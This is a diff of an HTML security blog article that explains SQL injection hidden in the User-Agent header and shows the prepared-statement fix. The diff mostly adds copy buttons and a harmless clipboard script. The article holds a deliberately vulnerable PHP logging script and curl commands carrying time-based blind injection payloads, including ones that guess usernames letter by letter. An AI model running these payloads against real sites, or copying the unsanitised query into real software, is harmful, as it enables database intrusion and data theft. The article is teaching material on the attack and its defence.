@@ -8,11 +8,37 @@
 <span class="line"><span class="sk-6f42c1-ffc799">Upgrade-Insecure-Requests:</span><span class="sk-005cc5-ffc799"> 1</span></span>
 <span class="line"><span class="sk-6f42c1-ffc799">User-Agent:</span><span class="sk-032f62-99ffe4"> Mozilla/5.0</span><span class="sk-24292e-fff"> (compatible; </span><span class="sk-6f42c1-ffc799">MSIE</span><span class="sk-005cc5-ffc799"> 11.0</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Windows</span><span class="sk-032f62-99ffe4"> NT</span><span class="sk-005cc5-ffc799"> 6.1</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Win64</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">x64</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Trident/5.0</span><span class="sk-24292e-fff">)</span><span class="sk-032f62-99ffe4">'+(select*from(select(sleep(20)))a)+'</span><span class="sk-24292e-fff"> </span></span>
 <span class="line"><span class="sk-6f42c1-ffc799">Accept-Encoding:</span><span class="sk-032f62-99ffe4"> gzip,</span><span class="sk-032f62-99ffe4"> deflate,</span><span class="sk-032f62-99ffe4"> sdch</span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">Accept-Language:</span><span class="sk-032f62-99ffe4"> en-US,en</span><span class="sk-24292e-fff">;q</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">0.8,fr</span><span class="sk-24292e-fff">;q</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">0.6</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">Accept-Language:</span><span class="sk-032f62-99ffe4"> en-US,en</span><span class="sk-24292e-fff">;q</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">0.8,fr</span><span class="sk-24292e-fff">;q</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">0.6</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
+<script type="module">
+	globalThis.process ??= {}, globalThis.process.env ??= {}, document.querySelectorAll(`[data-code-copy]`).forEach(e => {
+		let t = e.closest(`.emdash-code`)?.querySelector(`pre code`);
+		if (!t) return;
+		let n = e.dataset.copyLabel ?? ``,
+			r = e.dataset.copiedLabel ?? ``,
+			i = null;
+		e.addEventListener(`click`, () => {
+			navigator.clipboard.writeText(t.textContent ?? ``).then(() => {
+				e.setAttribute(`data-copied`, ``), e.setAttribute(`aria-label`, r), i && clearTimeout(i), i = setTimeout(() => {
+					e.removeAttribute(`data-copied`), e.setAttribute(`aria-label`, n), i = null
+				}, 1500)
+			}).catch(e => {
+				console.warn(`code-copy: clipboard write failed`, e)
+			})
+		})
+	});
+</script>
 <p>As I said, a simple request for the homepage of the web site, which at first glance doesn’t look suspicious at all. Unless your take a look at the <code>User-Agent</code> header (its value is the string that identifies the browser being used):</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">Mozilla/5.0</span><span class="sk-24292e-fff"> (compatible; </span><span class="sk-6f42c1-ffc799">MSIE</span><span class="sk-005cc5-ffc799"> 11.0</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Windows</span><span class="sk-032f62-99ffe4"> NT</span><span class="sk-005cc5-ffc799"> 6.1</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Win64</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">x64</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Trident/5.0</span><span class="sk-24292e-fff">)</span><span class="sk-032f62-99ffe4">'+(select*from(select(sleep(20)))a)+</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">Mozilla/5.0</span><span class="sk-24292e-fff"> (compatible; </span><span class="sk-6f42c1-ffc799">MSIE</span><span class="sk-005cc5-ffc799"> 11.0</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Windows</span><span class="sk-032f62-99ffe4"> NT</span><span class="sk-005cc5-ffc799"> 6.1</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Win64</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">x64</span><span class="sk-24292e-fff">; </span><span class="sk-6f42c1-ffc799">Trident/5.0</span><span class="sk-24292e-fff">)</span><span class="sk-032f62-99ffe4">'+(select*from(select(sleep(20)))a)+</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>The start looks reasonable (it’s apparently Microsoft Internet Explorer 11) but the agent strings ends with <code>'+(select*from(select(sleep(20)))a)+</code>. The attacker is attempting a <a href="https://en.wikipedia.org/wiki/SQL_injection" target="_blank" rel="noopener noreferrer">SQL injection</a> inside the <code>User-Agent</code> value.</p>
 <p>It’s common to see SQL injection in URIs and form parameters, but here the attacker has hidden the SQL query <code>select * from (select(sleep(20)))</code> inside the <code>User-Agent</code> HTTP request header. This technique is commonly used by scanning tools; for example, <a href="http://sqlmap.org" target="_blank" rel="noopener noreferrer">sqlmap</a> will try SQL injection against specific HTTP request headers with the <code>-p</code> option.</p>
@@ -43,7 +69,11 @@
 <span class="line"></span>
 <span class="line"><span class="sk-6f42c1-ffc799">?</span><span class="sk-24292e-fff">&gt;</span></span>
 <span class="line"></span>
-<span class="line"><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;b</span><span class="sk-d73a49-a0a0a0">&gt;</span><span class="sk-24292e-fff">Thanks </span><span class="sk-d73a49-a0a0a0">for</span><span class="sk-24292e-fff"> visiting</span><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">/b&gt;&lt;/body&gt;&lt;/html</span><span class="sk-d73a49-a0a0a0">&gt;</span></span></code></pre>
+<span class="line"><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;b</span><span class="sk-d73a49-a0a0a0">&gt;</span><span class="sk-24292e-fff">Thanks </span><span class="sk-d73a49-a0a0a0">for</span><span class="sk-24292e-fff"> visiting</span><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">/b&gt;&lt;/body&gt;&lt;/html</span><span class="sk-d73a49-a0a0a0">&gt;</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>It connects to a local MySQL database and selects the <code>analytics</code> database and then inserts the user agent of the visitor (which comes from the <code>User-Agent</code> HTTP header and is stored in <code>$_SERVER["HTTP_USER_AGENT"]</code>) into the database (along with the current date and time) without any sanitization at all!</p>
 <p>This is ripe for a SQL injection, but because my code doesn’t report any errors the attacker won’t know they managed an injection without something like the sleep trick.</p>
@@ -52,11 +82,19 @@
 </figure>
 <p>To exploit this application it’s enough to do the following (where <code>insecure.php</code> is the script above):</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -A</span><span class="sk-032f62-99ffe4"> "Mozilla/5.0', (select*from(select(sleep(20)))a)) #"</span><span class="sk-032f62-99ffe4"> http://example.com/insecure.php</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -A</span><span class="sk-032f62-99ffe4"> "Mozilla/5.0', (select*from(select(sleep(20)))a)) #"</span><span class="sk-032f62-99ffe4"> http://example.com/insecure.php</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>This sets the <code>User-Agent</code> HTTP header to <code>Mozilla/5.0', (select*from(select(sleep(20)))a)) #</code>. The poor PHP code that creates the query just inserts this string into the middle of the SQL query without any sanitization so the query becomes:</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">INSERT</span><span class="sk-032f62-99ffe4"> INTO</span><span class="sk-032f62-99ffe4"> visits</span><span class="sk-24292e-fff"> (ua, </span><span class="sk-032f62-99ffe4">dt</span><span class="sk-24292e-fff">) VALUES (</span><span class="sk-6f42c1-ffc799">'Mozilla/5.0'</span><span class="sk-6f42c1-ffc799">,</span><span class="sk-24292e-fff"> (select*from(select(sleep(20)))a)) </span><span class="sk-6a737d-8b8b8b94">#', '2016-05-17 03:16:06')</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">INSERT</span><span class="sk-032f62-99ffe4"> INTO</span><span class="sk-032f62-99ffe4"> visits</span><span class="sk-24292e-fff"> (ua, </span><span class="sk-032f62-99ffe4">dt</span><span class="sk-24292e-fff">) VALUES (</span><span class="sk-6f42c1-ffc799">'Mozilla/5.0'</span><span class="sk-6f42c1-ffc799">,</span><span class="sk-24292e-fff"> (select*from(select(sleep(20)))a)) </span><span class="sk-6a737d-8b8b8b94">#', '2016-05-17 03:16:06')</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>The two values to be inserted are now <code>Mozilla/5.0</code> and the result of the subquery <code>(select*from(select(sleep(20)))a)</code> (which takes 20 seconds). The <code>#</code> means that the rest of the query (which contains the inserted date/time) is turned into a comment and ignored.</p>
 <p>In the database an entry like this appears:</p>
@@ -65,7 +103,11 @@
 <span class="line"><span class="sk-d73a49-a0a0a0">|</span><span class="sk-6f42c1-ffc799"> dt</span><span class="sk-d73a49-a0a0a0">                  |</span><span class="sk-6f42c1-ffc799"> ua</span><span class="sk-d73a49-a0a0a0">            |</span></span>
 <span class="line"><span class="sk-6f42c1-ffc799">+---------------------+---------------+</span></span>
 <span class="line"><span class="sk-d73a49-a0a0a0">|</span><span class="sk-6f42c1-ffc799"> 0</span><span class="sk-d73a49-a0a0a0">                   |</span><span class="sk-6f42c1-ffc799"> Mozilla/5.0</span><span class="sk-d73a49-a0a0a0">   |</span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">+---------------------+---------------+</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">+---------------------+---------------+</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>Notice how the date/time is <code>0</code> (the result of the <code>(select*from(select(sleep(20)))a)</code>) and the user agent is just <code>Mozilla/5.0</code>. Entries like that are likely the only indication that an attacker had succeeded with a SQL injection.</p>
 <p>Here’s what the request looks like when it runs. I’ve used the <code>time</code> command to see how long the request takes to process.</p>
@@ -89,7 +131,11 @@
 <span class="line"></span>
 <span class="line"><span class="sk-032f62-99ffe4">real   0m20.614s</span></span>
 <span class="line"><span class="sk-032f62-99ffe4">user   0m0.007s</span></span>
-<span class="line"><span class="sk-032f62-99ffe4">sys    0m0.012s</span></span></code></pre>
+<span class="line"><span class="sk-032f62-99ffe4">sys    0m0.012s</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>It took 20 seconds. The SQL injection worked.</p>
 <h3>Exploitation</h3>
@@ -102,11 +148,19 @@
 <p>As an illustration I created a table in the database called <code>users</code> containing a user called root and a user called <code>john</code>. Here’s how an attacker might discover that there is a <code>john</code> user. They can craft a query that works out the name of a user letter by letter just by looking at the time a request takes to return.</p>
 <p>For example,</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -A</span><span class="sk-032f62-99ffe4"> "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='a')) #"</span><span class="sk-032f62-99ffe4"> http://example.com/insecure.php</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -A</span><span class="sk-032f62-99ffe4"> "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='a')) #"</span><span class="sk-032f62-99ffe4"> http://example.com/insecure.php</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>returns immediately because there are no users with a name starting with <code>a</code>. But</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -A</span><span class="sk-032f62-99ffe4"> "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='j')) #"</span><span class="sk-032f62-99ffe4"> http://example.com/insecure.php</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -A</span><span class="sk-032f62-99ffe4"> "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='j')) #"</span><span class="sk-032f62-99ffe4"> http://example.com/insecure.php</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>takes 20 seconds. The attacker can then try two letters, three letters, and so on. The same technique can be used to extract other data from the database.</p>
 <p>If my web app was a little more sophisticated, say, for example, it was part of a blogging platform that allowed comments, it would be possible to use this vulnerability to dump the contents of an entire database table into a comment. The attacker could return and display the appropriate comment to read the table's contents. That way large amounts of data can be <a href="https://www.cloudflare.com/learning/security/what-is-data-exfiltration" target="_blank" rel="noopener noreferrer">exfiltrated</a>.</p>
@@ -125,7 +179,11 @@
 <span class="line"></span>
 <span class="line"><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">html</span><span class="sk-d73a49-a0a0a0">&gt;</span></span>
 <span class="line"><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">head&gt;&lt;/head</span><span class="sk-d73a49-a0a0a0">&gt;</span></span>
-<span class="line"><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">body&gt;&lt;b</span><span class="sk-d73a49-a0a0a0">&gt;</span><span class="sk-24292e-fff">Thanks </span><span class="sk-d73a49-a0a0a0">for</span><span class="sk-24292e-fff"> visiting</span><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">/b&gt;&lt;/body</span><span class="sk-d73a49-a0a0a0">&gt;</span></span></code></pre>
+<span class="line"><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">body&gt;&lt;b</span><span class="sk-d73a49-a0a0a0">&gt;</span><span class="sk-24292e-fff">Thanks </span><span class="sk-d73a49-a0a0a0">for</span><span class="sk-24292e-fff"> visiting</span><span class="sk-d73a49-a0a0a0">&lt;</span><span class="sk-24292e-fff">/b&gt;&lt;/body</span><span class="sk-d73a49-a0a0a0">&gt;</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>This prepares the SQL query to perform the insertion using <a href="https://secure.php.net/manual/en/mysqli.prepare.php" target="_blank" rel="noopener noreferrer"><code>prepare</code></a> and then binds the two parameters (the user agent and the date/time) using <a href="https://secure.php.net/manual/en/mysqli-stmt.bind-param.php" target="_blank" rel="noopener noreferrer"><code>bind_param</code></a> and then runs the query with <a href="https://secure.php.net/manual/en/mysqli-stmt.execute.php" target="_blank" rel="noopener noreferrer"><code>execute</code></a>.</p>
 <p><code>bind_param</code> ensures that the special SQL characters like quotes are escaped correctly for insertion in the database. Trying to repeat the injection above results in the following database entry:</p>
@@ -134,7 +192,11 @@
 <span class="line"><span class="sk-d73a49-a0a0a0">|</span><span class="sk-6f42c1-ffc799"> dt</span><span class="sk-d73a49-a0a0a0">                  |</span><span class="sk-6f42c1-ffc799"> ua</span><span class="sk-d73a49-a0a0a0">                                                 |</span></span>
 <span class="line"><span class="sk-6f42c1-ffc799">+---------------------+----------------------------------------------------+</span></span>
 <span class="line"><span class="sk-d73a49-a0a0a0">|</span><span class="sk-6f42c1-ffc799"> 2016-05-17</span><span class="sk-032f62-99ffe4"> 04:46:02</span><span class="sk-d73a49-a0a0a0"> |</span><span class="sk-6f42c1-ffc799"> Mozilla/5.0</span><span class="sk-6f42c1-ffc799">',(select*from(select(sleep(20)))a)) #  |</span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">+---------------------+----------------------------------------------------+</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">+---------------------+----------------------------------------------------+</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>The attacker's SQL statement has not turned into a SQL injection and has simply been stored in the database.</p>
 <h3>Conclusion</h3>
